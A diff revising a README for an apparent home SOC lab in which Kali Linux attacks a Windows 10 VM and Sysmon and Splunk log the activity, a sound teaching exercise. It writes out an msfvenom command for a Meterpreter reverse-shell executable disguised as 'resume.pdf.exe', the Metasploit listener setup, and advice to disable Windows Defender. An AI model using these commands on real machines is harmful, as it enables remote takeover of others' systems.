@@ -1,118 +1,179 @@
-# -SOC-Home-Lab-Attack-Defense-Simulation-
-This project demonstrates the setup of a home lab environment for cybersecurity testing, including an attack machine (Kali Linux), a target machine (Windows 10 VM), and a logging system (Splunk) to monitor malicious activities.The project involves:
+# 🔧 SOC Home Lab: Attack-Defense Simulation
 
-Setting up virtual machines
-Installing and configuring Sysmon for log collection
-Deploying malware using msfvenom
-Monitoring attacks using Splunk
+This project simulates a cybersecurity environment for offensive and defensive testing using Kali Linux, Windows 10, Sysmon, and Splunk. It allows practical exposure to attack execution, malware detection, and log monitoring.
 
+---
 
+## 🔁 Project Overview
 
-🔧Prerequisites
+| Component  | Role                   |
+| ---------- | ---------------------- |
+| Kali Linux | Attacker               |
+| Windows 10 | Target                 |
+| Splunk     | Log Monitoring (SIEM)  |
+| Sysmon     | System Event Collector |
 
-Requirement	Description
-RAM	At least 16GB (to run multiple VMs)
-Virtualization Software	VMware Workstation or VirtualBox
-Operating Systems	ISO files for Windows 10 and Kali Linux
-Logging Tools	Splunk and Sysmon setup files
-Internet Connection	Required for downloading and configuring tools
+---
 
-Network Topology
+## 🔧 Tools & Requirements
 
-Below is a simple network topology illustrating the setup:
-   [Kali Linux (Attacker)]  --->  [Windows 10 VM (Target)]  --->  [Splunk (Log Monitoring)]
+| Requirement         | Description                      |
+| ------------------- | -------------------------------- |
+| RAM                 | 16GB+ for smooth VM operation    |
+| Virtualization Tool | VMware Workstation / VirtualBox  |
+| OS ISOs             | Windows 10 & Kali Linux          |
+| Logging Tools       | Splunk, Sysmon                   |
+| Internet            | Required for downloads & updates |
 
-The Kali Linux machine attacks the Windows VM, and logs are collected by Splunk for analysis.
+---
 
+## 🗺️ Network Topology
 
-Step 1: Setting Up Virtual Machines
+```
+[Kali Linux (Attacker)] ---> [Windows 10 VM (Target)] ---> [Splunk (SIEM/Logs)]
+```
 
-1.1 Install Kali Linux (Attacker Machine)
-Download Kali Linux ISO from Kali Official Website.
-Create a new VM in VMware/VirtualBox and install Kali Linux.
-Update and upgrade Kali:
+---
+
+## ✅ Step-by-Step Setup
+
+### ① Kali Linux Setup (Attacker)
+
+```bash
+# Update system
 sudo apt update && sudo apt upgrade -y
+```
 
-1.2 Install Windows 10 (Target Machine)
-Download Windows 10 ISO from Microsoft's website.
-Create a new VM and install Windows 10.
-Ensure networking is enabled for communication between VMs.
+### ② Windows 10 Setup (Target)
 
+* Install Windows 10 ISO.
+* Enable networking (NAT/Bridged/Internal).
 
-Step 2: Installing Splunk for Log Monitoring
+### ③ Install Splunk on Windows 10
 
-Download Splunk Free from Splunk Website.
-Install Splunk on your Windows 10 VM.
-Start Splunk and log in with admin credentials.
-Enable data collection for monitoring logs.
+1. Download Splunk Free Edition.
+2. Install Splunk and launch it.
+3. Login using admin credentials.
+4. Enable data input for logs.
 
-Step 3: Installing Sysmon on Windows 10
+### ④ Install Sysmon on Windows 10
 
-Download Sysmon from Microsoft Sysinternals.
-Download a pre-configured sysmonconfig.xml from Sysmon Modular.
-Open PowerShell as Administrator and run:
-cd "C:\Users\Downloads\sysmon"
+```powershell
+# Open PowerShell as Administrator
+cd "C:\Users\<YourUser>\Downloads\sysmon"
 .\sysmon64.exe -i sysmonconfig.xml
-Verify Sysmon is running:
+
+# Verify installation
 Get-Process sysmon64
+```
 
+---
 
-Step 4: Generating Malware with msfvenom
+## 🔧 Malware Generation & Attack
 
-On Kali Linux, generate a malicious executable:
+### ⑤ Generate Payload (Kali Linux)
+
+```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Attacker_IP> LPORT=4444 -f exe -o resume.pdf.exe
+```
 
-This creates resume.pdf.exe, which acts as our payload.
+### ⑥ Set Up Listener (Metasploit)
 
-
-Step 5: Setting Up a Metasploit Listener
-
-Open Metasploit on Kali:
+```bash
 msfconsole
-Configure the listener:
 use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_tcp
 set LHOST <Attacker_IP>
 set LPORT 4444
 exploit
+```
 
+* Transfer and execute `resume.pdf.exe` on the Windows target.
+* Gain reverse shell:
 
-Deploy resume.pdf.exe on Windows 10 and execute it.
-
-If successful, you gain a Meterpreter session:
+```bash
 meterpreter > sysinfo
+```
 
-Step 6: Monitoring Logs with Splunk
+---
 
-Open Splunk and search for unauthorized activity:
+## 🔍 Splunk Log Monitoring
+
+```spl
+# Search for security logs
 index=main sourcetype=WinEventLog:Security
-Identify anomalies related to unauthorized access.
+```
 
-Create alerts to detect suspicious behavior.
-🔍Troubleshooting
-1. Metasploit Handler Not Receiving a Session
-Ensure Windows Defender is disabled to prevent blocking the payload.
-Double-check LHOST and LPORT settings in both msfvenom and msfconsole.
-Run the payload on Windows as Administrator.
+* Create alerts for event IDs:
 
-3. Splunk Not Logging Events
-Verify Sysmon is correctly installed and running.
-Ensure Windows Event Logging is enabled in Splunk.
-Restart Splunk and recheck the event index.
+  * Unauthorized access attempts
+  * Process creation logs from Sysmon
 
-🎯Next Steps & Future Improvements
-Integrate ELK Stack for enhanced log analysis.
-Automate attack execution using Python scripts.
-Implement Wazuh SIEM for better threat detection.
-How to Contribute
-Interested in improving this project? Contributions are welcome!
+---
 
-Fork the repository.
-Create a new branch with your improvements.
-Submit a pull request for review
+## ⚠️ Troubleshooting Guide
 
-Conclusion
-This project demonstrates how to:
-Set up a cybersecurity home lab
-Deploy and detect malware
-Use Splunk for threat monitoring
+| Issue                        | Resolution                                                  |
+| ---------------------------- | ----------------------------------------------------------- |
+| No Meterpreter session       | Disable Windows Defender, check IPs and ports, run as Admin |
+| No logs in Splunk            | Ensure Sysmon is active, check Event Log configs            |
+| Listener error in Metasploit | Restart handler, verify payload parameters                  |
+
+---
+
+## 🎯 Enhancements & Future Work
+
+* ✈ Integrate ELK stack (Elasticsearch, Logstash, Kibana)
+* ⚙️ Automate attack simulations using Python & cron
+* 🚀 Implement Wazuh for advanced SIEM capabilities
+* 🌟 Add Zeek & Suricata for network traffic analysis
+
+---
+
+## 📊 Comparative Table: Splunk vs ELK Stack
+
+| Feature           | Splunk   | ELK Stack       |
+| ----------------- | -------- | --------------- |
+| Licensing         | Freemium | Open-source     |
+| Log Visualization | Strong   | Very Strong     |
+| Setup Complexity  | Easy     | Moderate-High   |
+| Performance       | High     | Moderate-High   |
+| Customization     | Limited  | Highly Flexible |
+
+---
+
+## 📝 How to Contribute
+
+1. Fork the repository.
+2. Create a branch: `git checkout -b feature/improvement`
+3. Commit changes: `git commit -m "Added feature X"`
+4. Push to branch: `git push origin feature/improvement`
+5. Submit a pull request.
+
+---
+
+## 📄 Conclusion
+
+This project demonstrates:
+
+* How to build a realistic attack-defense cyber lab
+* Craft and deliver malware payloads safely
+* Detect and monitor threats using Splunk and Sysmon
+
+> ✨ *Perfect for cybersecurity enthusiasts looking to learn real-world red-blue teaming skills in a virtual environment.*
+
+---
+
+## 📢 Stickers/Badges
+
+![MIT License](https://img.shields.io/badge/license-MIT-green.svg)
+![SOC Lab](https://img.shields.io/badge/SOC-Lab-blue.svg)
+![Splunk](https://img.shields.io/badge/Tool-Splunk-yellow)
+![Kali Linux](https://img.shields.io/badge/OS-Kali-red)
+![Windows](https://img.shields.io/badge/OS-Windows-blue)
+
+---
+
+> 🚀 "Train in the lab. Hunt in the wild."
+
+---
